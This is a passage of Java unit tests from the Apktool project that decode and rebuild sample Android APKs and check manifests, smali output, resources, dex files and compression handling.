            for (int i = 1; i < w; i++) {
                if (isTransparent(controlImage.getRGB(i, 0))) {
                    assertTrue(isTransparent(testImage.getRGB(i, 0)));
                } else {
                    assertEquals("Image lost npTc chunk on image " + ninePatch + " at (x, y) (" + i + "," + 0 + ")",
                            controlImage.getRGB(i, 0), testImage.getRGB(i, 0));
                }
            }

            // Check the entire vertical line
            for (int i = 1; i < h; i++) {
                if (isTransparent(controlImage.getRGB(0, i))) {
                    assertTrue(isTransparent(testImage.getRGB(0, i)));
                } else {
                    assertEquals("Image lost npTc chunk on image " + ninePatch + " at (x, y) (" + 0 + "," + i + ")",
                            controlImage.getRGB(0, i), testImage.getRGB(0, i));
                }
            }
        }
    }

    @Test
    public void confirmZeroByteFileExtensionIsNotStored() throws BrutException {
        MetaInfo metaInfo = new Androlib().readMetaFile(sTestNewDir);

        for (String item : metaInfo.doNotCompress) {
            assertNotEquals("jpg", item);
        }
    }

    @Test
    public void confirmZeroByteFileIsStored() throws BrutException {
        MetaInfo metaInfo = new Androlib().readMetaFile(sTestNewDir);
        assertTrue(metaInfo.doNotCompress.contains("assets/0byte_file.jpg"));
    }

    @Test
    public void drawableXxhdpiTest() throws BrutException, IOException {
        compareResFolder("drawable-xxhdpi");
    }

    @Test
    public void drawableQualifierXxhdpiTest() throws BrutException, IOException {
        compareResFolder("drawable-xxhdpi-v4");
    }

    @Test
    public void drawableXxxhdpiTest() throws BrutException, IOException {
        compareResFolder("drawable-xxxhdpi");
    }

    @Test
    public void resRawTest() throws BrutException, IOException {
        compareResFolder("raw");
    }

    @Test
    public void libsTest() throws BrutException, IOException {
        compareLibsFolder("libs");
        compareLibsFolder("lib");
    }

    @Test
    public void unknownFolderTest() throws BrutException {
        compareUnknownFiles();
    }

    @Test
    public void fileAssetTest() throws BrutException, IOException {
        compareAssetsFolder("txt");
    }

    @Test
    public void unicodeAssetTest() throws BrutException, IOException {
        assumeTrue(! OSDetection.isWindows());
        compareAssetsFolder("unicode-txt");
    }

    @Test
    public void multipleDexTest() throws BrutException, IOException {
        compareBinaryFolder("/smali_classes2", false);
        compareBinaryFolder("/smali_classes3", false);

        File classes2Dex = new File(sTestOrigDir, "build/apk/classes2.dex");
        File classes3Dex = new File(sTestOrigDir, "build/apk/classes3.dex");

        assertTrue(classes2Dex.isFile());
        assertTrue(classes3Dex.isFile());
    }

    @Test
    public void singleDexTest() throws BrutException, IOException {
        compareBinaryFolder("/smali", false);

        File classesDex = new File(sTestOrigDir, "build/apk/classes.dex");
        assertTrue(classesDex.isFile());
    }

    @Test
    public void confirmKotlinFolderPersistsTest() {
        checkFolderExists("/kotlin");
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt1/DebugTagRetainedTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt1;

import brut.androlib.*;
import brut.androlib.options.BuildOptions;
import brut.directory.ExtFile;
import brut.common.BrutException;
import brut.util.OS;
import org.custommonkey.xmlunit.XMLUnit;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;
import org.xml.sax.SAXException;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

import static org.junit.Assert.assertTrue;
import static org.custommonkey.xmlunit.XMLAssert.assertXMLEqual;

public class DebugTagRetainedTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        sTestOrigDir = new ExtFile(sTmpDir, "issue1235-orig");
        sTestNewDir = new ExtFile(sTmpDir, "issue1235-new");
        LOGGER.info("Unpacking issue1235...");
        TestUtils.copyResourceDir(DebugTagRetainedTest.class, "aapt1/issue1235/", sTestOrigDir);

        LOGGER.info("Building issue1235.apk...");
        BuildOptions buildOptions = new BuildOptions();
        buildOptions.debugMode = true;

        File testApk = new File(sTmpDir, "issue1235.apk");
        new Androlib(buildOptions).build(sTestOrigDir, testApk);

        LOGGER.info("Decoding issue1235.apk...");
        ApkDecoder apkDecoder = new ApkDecoder(testApk);
        apkDecoder.setOutDir(sTestNewDir);
        apkDecoder.decode();
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
    }

    @Test
    public void DebugIsTruePriorToBeingFalseTest() throws IOException, SAXException {
        String apk = "issue1235-new";

        String expected = TestUtils.replaceNewlines("<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?>" +
                "<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" android:compileSdkVersion=\"23\" " +
                "android:compileSdkVersionCodename=\"6.0-2438415\" package=\"com.ibotpeaches.issue1235\" platformBuildVersionCode=\"20\" " +
                "platformBuildVersionName=\"4.4W.2-1537038\">    <application android:debuggable=\"true\"/></manifest>");

        byte[] encoded = Files.readAllBytes(Paths.get(sTmpDir + File.separator + apk + File.separator + "AndroidManifest.xml"));
        String obtained = TestUtils.replaceNewlines(new String(encoded));

        XMLUnit.setIgnoreWhitespace(true);
        XMLUnit.setIgnoreAttributeOrder(true);
        XMLUnit.setCompareUnmatched(false);

        assertXMLEqual(expected, obtained);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt1/DefaultBaksmaliVariableTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt1;

import brut.androlib.Androlib;
import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

import static org.junit.Assert.assertEquals;

public class DefaultBaksmaliVariableTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        sTmpDir = new ExtFile(OS.createTempDirectory());
        sTestOrigDir = new ExtFile(sTmpDir, "testjar-orig");
        sTestNewDir = new ExtFile(sTmpDir, "testjar-new");
        LOGGER.info("Unpacking testjar...");
        TestUtils.copyResourceDir(DefaultBaksmaliVariableTest.class, "aapt1/issue1481/", sTestOrigDir);

        LOGGER.info("Building issue1481.jar...");
        File testJar = new File(sTmpDir, "issue1481.jar");
        new Androlib().build(sTestOrigDir, testJar);

        LOGGER.info("Decoding issue1481.jar...");
        ApkDecoder apkDecoder = new ApkDecoder(testJar);
        apkDecoder.setOutDir(sTestNewDir);
        apkDecoder.decode();
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void confirmBaksmaliParamsAreTheSame() throws BrutException, IOException {
        String expected = TestUtils.replaceNewlines(".class public final Lcom/ibotpeaches/issue1481/BuildConfig;\n" +
                ".super Ljava/lang/Object;\n" +
                ".source \"BuildConfig.java\"\n" +
                "\n" +
                "\n" +
                "# static fields\n" +
                ".field public static final APPLICATION_ID:Ljava/lang/String; = \"com.ibotpeaches.issue1481\"\n" +
                "\n" +
                ".field public static final BUILD_TYPE:Ljava/lang/String; = \"debug\"\n" +
                "\n" +
                ".field public static final DEBUG:Z\n" +
                "\n" +
                ".field public static final FLAVOR:Ljava/lang/String; = \"\"\n" +
                "\n" +
                ".field public static final VERSION_CODE:I = 0x1\n" +
                "\n" +
                ".field public static final VERSION_NAME:Ljava/lang/String; = \"1.0\"\n" +
                "\n" +
                "\n" +
                "# direct methods\n" +
                ".method static constructor <clinit>()V\n" +
                "    .locals 1\n" +
                "\n" +
                "    .prologue\n" +
                "    .line 7\n" +
                "    const-string v0, \"true\"\n" +
                "\n" +
                "    invoke-static {v0}, Ljava/lang/Boolean;->parseBoolean(Ljava/lang/String;)Z\n" +
                "\n" +
                "    move-result v0\n" +
                "\n" +
                "    sput-boolean v0, Lcom/ibotpeaches/issue1481/BuildConfig;->DEBUG:Z\n" +
                "\n" +
                "    return-void\n" +
                ".end method\n" +
                "\n" +
                ".method public constructor <init>()V\n" +
                "    .locals 0\n" +
                "\n" +
                "    .prologue\n" +
                "    .line 6\n" +
                "    invoke-direct {p0}, Ljava/lang/Object;-><init>()V\n" +
                "\n" +
                "    return-void\n" +
                ".end method");

        byte[] encoded = Files.readAllBytes(Paths.get(sTestNewDir + File.separator + "smali" + File.separator
        + "com" + File.separator + "ibotpeaches" + File.separator + "issue1481" + File.separator + "BuildConfig.smali"));

        String obtained = TestUtils.replaceNewlines(new String(encoded));
        assertEquals(expected, obtained);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt1/EmptyResourcesArscTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt1;

import brut.androlib.Androlib;
import brut.androlib.ApkDecoder;
import brut.androlib.options.BuildOptions;
import brut.androlib.TestUtils;
import brut.directory.ExtFile;
import brut.common.BrutException;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;
import java.util.logging.Logger;

import static org.junit.Assert.assertTrue;

public class EmptyResourcesArscTest {
    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        sTestOrigDir = new ExtFile(sTmpDir, "issue1730-orig");
        sTestNewDir = new ExtFile(sTmpDir, "issue1730-new");
        LOGGER.info("Unpacking issue1730.apk...");
        TestUtils.copyResourceDir(EmptyResourcesArscTest.class, "aapt1/issue1730", sTestOrigDir);

        File testApk = new File(sTestOrigDir, "issue1730.apk");

        LOGGER.info("Decoding issue1730.apk...");
        ApkDecoder apkDecoder = new ApkDecoder(testApk);
        apkDecoder.setOutDir(sTestNewDir);
        apkDecoder.decode();

        LOGGER.info("Building issue1730.apk...");
        BuildOptions buildOptions = new BuildOptions();
        new Androlib(buildOptions).build(sTestNewDir, testApk);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
        assertTrue(sTestOrigDir.isDirectory());
    }

    private static ExtFile sTmpDir;
    private static ExtFile sTestOrigDir;
    private static ExtFile sTestNewDir;

    private final static Logger LOGGER = Logger.getLogger(EmptyResourcesArscTest.class.getName());
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt1/LargeIntsInManifestTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt1;

import brut.androlib.Androlib;
import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.directory.ExtFile;
import brut.common.BrutException;
import brut.util.OS;
import java.io.File;
import java.io.IOException;

import org.junit.*;

public class LargeIntsInManifestTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(LargeIntsInManifestTest.class, "aapt1/issue767/", sTmpDir);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void checkIfLargeIntsAreHandledTest() throws BrutException, IOException {
        String apk = "issue767.apk";

        // decode issue767.apk
        ApkDecoder apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + apk));
        sTestOrigDir = new ExtFile(sTmpDir + File.separator + apk + ".out");

        apkDecoder.setOutDir(new File(sTmpDir + File.separator + apk + ".out"));
        apkDecoder.decode();

        // build issue767
        ExtFile testApk = new ExtFile(sTmpDir, apk + ".out");
        new Androlib().build(testApk, null);
        String newApk = apk + ".out" + File.separator + "dist" + File.separator + apk;

        // decode issue767 again
        apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + newApk));
        sTestNewDir = new ExtFile(sTmpDir + File.separator + apk + ".out.two");

        apkDecoder.setOutDir(new File(sTmpDir + File.separator + apk + ".out.two"));
        apkDecoder.decode();

        compareXmlFiles("AndroidManifest.xml");
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt1/ProviderAttributeTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt1;

import brut.androlib.Androlib;
import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.directory.ExtFile;
import brut.common.BrutException;
import brut.util.OS;
import org.custommonkey.xmlunit.XMLUnit;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;
import org.xml.sax.SAXException;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

import static org.custommonkey.xmlunit.XMLAssert.assertXMLEqual;
import static org.junit.Assert.assertTrue;

public class ProviderAttributeTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws BrutException {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(ProviderAttributeTest.class, "aapt1/issue636/", sTmpDir);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void isProviderStringReplacementWorking() throws BrutException, IOException, SAXException {
        String apk = "issue636.apk";

        // decode issue636.apk
        ApkDecoder apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + apk));
        apkDecoder.setOutDir(new File(sTmpDir + File.separator + apk + ".out"));
        apkDecoder.decode();

        // build issue636
        ExtFile testApk = new ExtFile(sTmpDir, apk + ".out");
        new Androlib().build(testApk, null);
        String newApk = apk + ".out" + File.separator + "dist" + File.separator + apk;
        assertTrue(fileExists(newApk));

        // decode issues636 again
        apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + newApk));
        apkDecoder.setOutDir(new File(sTmpDir + File.separator + apk + ".out.two"));
        apkDecoder.decode();

        String expected = TestUtils.replaceNewlines("<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?>\n" +
                "<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" android:compileSdkVersion=\"23\" android:compileSdkVersionCodename=\"6.0-2438415\" package=\"com.ibotpeaches.issue636\" platformBuildVersionCode=\"22\" platformBuildVersionName=\"5.1-1756733\">\n" +
                "    <application android:allowBackup=\"true\" android:debuggable=\"true\" android:icon=\"@mipmap/ic_launcher\" android:label=\"@string/app_name\" android:theme=\"@style/AppTheme\">\n" +
                "        <provider android:authorities=\"com.ibotpeaches.issue636.Provider\" android:exported=\"false\" android:grantUriPermissions=\"true\" android:label=\"@string/app_name\" android:multiprocess=\"false\" android:name=\"com.ibotpeaches.issue636.Provider\"/>\n" +
                "        <provider android:authorities=\"com.ibotpeaches.issue636.ProviderTwo\" android:exported=\"false\" android:grantUriPermissions=\"true\" android:label=\"@string/app_name\" android:multiprocess=\"false\" android:name=\"com.ibotpeaches.issue636.ProviderTwo\"/>\n" +
                "    </application>\n" +
                "</manifest>");


        byte[] encoded = Files.readAllBytes(Paths.get(sTmpDir + File.separator + apk + ".out.two" + File.separator + "AndroidManifest.xml"));
        String obtained = TestUtils.replaceNewlines(new String(encoded));

        XMLUnit.setIgnoreWhitespace(true);
        XMLUnit.setIgnoreAttributeOrder(true);
        XMLUnit.setCompareUnmatched(false);

        assertXMLEqual(expected, obtained);
    }

    private boolean fileExists(String filepath) {
        return Files.exists(Paths.get(sTmpDir.getAbsolutePath() + File.separator + filepath));
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt1/ReferenceVersionCodeTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt1;

import brut.androlib.Androlib;
import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.androlib.meta.MetaInfo;
import brut.directory.ExtFile;
import brut.common.BrutException;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;
import java.io.IOException;

import static org.junit.Assert.assertEquals;

public class ReferenceVersionCodeTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(ReferenceVersionCodeTest.class, "aapt1/issue1234/", sTmpDir);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void referenceBecomesLiteralTest() throws BrutException, IOException {
        String apk = "issue1234.apk";

        // decode issue1234.apk
        ApkDecoder apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + apk));
        ExtFile decodedApk = new ExtFile(sTmpDir + File.separator + apk + ".out");
        apkDecoder.setOutDir(new File(sTmpDir + File.separator + apk + ".out"));
        apkDecoder.decode();

        MetaInfo metaInfo = new Androlib().readMetaFile(decodedApk);
        assertEquals("v1.0.0", metaInfo.versionInfo.versionName);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt1/SharedLibraryTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt1;

import brut.androlib.*;
import brut.androlib.options.BuildOptions;
import brut.directory.ExtFile;
import brut.common.BrutException;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

import static org.junit.Assert.assertTrue;

public class SharedLibraryTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws BrutException {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(SharedLibraryTest.class, "aapt1/shared_libraries/", sTmpDir);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void isFrameworkTaggingWorking() throws AndrolibException {
        String apkName = "library.apk";

        BuildOptions buildOptions = new BuildOptions();
        buildOptions.frameworkFolderLocation = sTmpDir.getAbsolutePath();
        buildOptions.frameworkTag = "building";

        new Androlib(buildOptions).installFramework(new File(sTmpDir + File.separator + apkName));

        assertTrue(fileExists("2-building.apk"));
    }

    @Test
    public void isFrameworkInstallingWorking() throws AndrolibException {
        String apkName = "library.apk";

        BuildOptions buildOptions = new BuildOptions();
        buildOptions.frameworkFolderLocation = sTmpDir.getAbsolutePath();

        new Androlib(buildOptions).installFramework(new File(sTmpDir + File.separator + apkName));

        assertTrue(fileExists("2.apk"));
    }

    @Test
    public void isSharedResourceDecodingAndRebuildingWorking() throws IOException, BrutException {
        String library = "library.apk";
        String client = "client.apk";

        // setup apkOptions
        BuildOptions buildOptions = new BuildOptions();
        buildOptions.frameworkFolderLocation = sTmpDir.getAbsolutePath();
        buildOptions.frameworkTag = "shared";

        // install library/framework
        new Androlib(buildOptions).installFramework(new File(sTmpDir + File.separator + library));
        assertTrue(fileExists("2-shared.apk"));

        // decode client.apk
        ApkDecoder apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + client));
        apkDecoder.setOutDir(new File(sTmpDir + File.separator + client + ".out"));
        apkDecoder.setFrameworkDir(buildOptions.frameworkFolderLocation);
        apkDecoder.setFrameworkTag(buildOptions.frameworkTag);
        apkDecoder.decode();

        // decode library.apk
        ApkDecoder libraryDecoder = new ApkDecoder(new File(sTmpDir + File.separator + library));
        libraryDecoder.setOutDir(new File(sTmpDir + File.separator + library + ".out"));
        libraryDecoder.setFrameworkDir(buildOptions.frameworkFolderLocation);
        libraryDecoder.setFrameworkTag(buildOptions.frameworkTag);
        libraryDecoder.decode();

        // build client.apk
        ExtFile clientApk = new ExtFile(sTmpDir, client + ".out");
        new Androlib(buildOptions).build(clientApk, null);
        assertTrue(fileExists(client + ".out" + File.separator + "dist" + File.separator + client));

        // build library.apk (shared library)
        ExtFile libraryApk = new ExtFile(sTmpDir, library + ".out");
        new Androlib(buildOptions).build(libraryApk, null);
        assertTrue(fileExists(library + ".out" + File.separator + "dist" + File.separator + library));
    }

    private boolean fileExists(String filepath) {
        return Files.exists(Paths.get(sTmpDir.getAbsolutePath() + File.separator + filepath));
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt1/SkipAssetTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt1;

import brut.androlib.ApkDecoder;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.directory.ExtFile;
import brut.common.BrutException;
import brut.util.OS;
import java.io.File;
import java.io.IOException;

import org.junit.*;
import static org.junit.Assert.*;

public class SkipAssetTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(SkipAssetTest.class, "aapt1/issue1605/", sTmpDir);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void checkIfEnablingSkipAssetWorks() throws BrutException, IOException {
        String apk = "issue1605.apk";

        // decode issue1605.apk
        ApkDecoder apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + apk));
        sTestOrigDir = new ExtFile(sTmpDir + File.separator + apk + ".out");

        apkDecoder.setOutDir(sTestOrigDir);
        apkDecoder.setDecodeAssets(ApkDecoder.DECODE_ASSETS_NONE);
        apkDecoder.setForceDelete(true);
        apkDecoder.decode();

        checkFileDoesNotExist("assets" + File.separator + "kotlin.kotlin_builtins");
        checkFileDoesNotExist("assets" + File.separator + "ranges" + File.separator + "ranges.kotlin_builtins");
    }

    @Test
    public void checkControl() throws BrutException, IOException {
        String apk = "issue1605.apk";

        // decode issue1605.apk
        ApkDecoder apkDecoder = new ApkDecoder(new File(sTmpDir + File.separator + apk));
        sTestOrigDir = new ExtFile(sTmpDir + File.separator + apk + ".out");

        apkDecoder.setOutDir(sTestOrigDir);
        apkDecoder.setDecodeAssets(ApkDecoder.DECODE_ASSETS_FULL);
        apkDecoder.setForceDelete(true);
        apkDecoder.decode();

        checkFileDoesExist("assets" + File.separator + "kotlin.kotlin_builtins");
        checkFileDoesExist("assets" + File.separator + "ranges" + File.separator + "ranges.kotlin_builtins");
    }

    private void checkFileDoesNotExist(String path) throws BrutException {
        File f =  new File(sTestOrigDir, path);

        assertFalse(f.isFile());
    }

    private void checkFileDoesExist(String path) throws BrutException {
        File f =  new File(sTestOrigDir, path);

        assertTrue(f.isFile());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/aapt1/UnknownCompressionTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.aapt1;

import brut.androlib.*;
import brut.androlib.options.BuildOptions;
import brut.directory.ExtFile;
import brut.common.BrutException;
import brut.util.OS;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.File;
import java.io.IOException;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertNotSame;

public class UnknownCompressionTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();
        sTmpDir = new ExtFile(OS.createTempDirectory());
        TestUtils.copyResourceDir(UnknownCompressionTest.class, "aapt1/unknown_compression/", sTmpDir);

        String apk = "deflated_unknowns.apk";
        BuildOptions buildOptions = new BuildOptions();
        buildOptions.frameworkFolderLocation = sTmpDir.getAbsolutePath();

        sTestOrigDir = new ExtFile(sTmpDir, apk);

        // decode deflated_unknowns.apk
        ApkDecoder apkDecoder = new ApkDecoder(sTestOrigDir);
        apkDecoder.setOutDir(new File(sTestOrigDir.getAbsolutePath() + ".out"));
        apkDecoder.decode();

        // build deflated_unknowns
        ExtFile clientApkFolder = new ExtFile(sTestOrigDir.getAbsolutePath() + ".out");
        new Androlib(buildOptions).build(clientApkFolder, null);
        sTestNewDir = new ExtFile(clientApkFolder, "dist" + File.separator + apk);
    }

    @AfterClass
    public static void afterClass() throws BrutException {
        OS.rmdir(sTmpDir);
    }

    @Test
    public void pkmExtensionDeflatedTest() throws BrutException, IOException {
        Integer control = sTestOrigDir.getDirectory().getCompressionLevel("assets/bin/Data/test.pkm");
        Integer rebuilt = sTestNewDir.getDirectory().getCompressionLevel("assets/bin/Data/test.pkm");

        // Check that control = rebuilt (both deflated)
        // Add extra check for checking not equal to 0, just in case control gets broken
        assertEquals(control, rebuilt);
        assertNotSame(0, rebuilt);
    }

    @Test
    public void doubleExtensionStoredTest() throws BrutException, IOException {
        Integer control = sTestOrigDir.getDirectory().getCompressionLevel("assets/bin/Data/two.extension.file");
        Integer rebuilt = sTestNewDir.getDirectory().getCompressionLevel("assets/bin/Data/two.extension.file");

        // Check that control = rebuilt (both stored)
        // Add extra check for checking = 0 to enforce check for stored just in case control breaks
        assertEquals(control, rebuilt);
        assertEquals(Integer.valueOf(0), rebuilt);
    }

    @Test
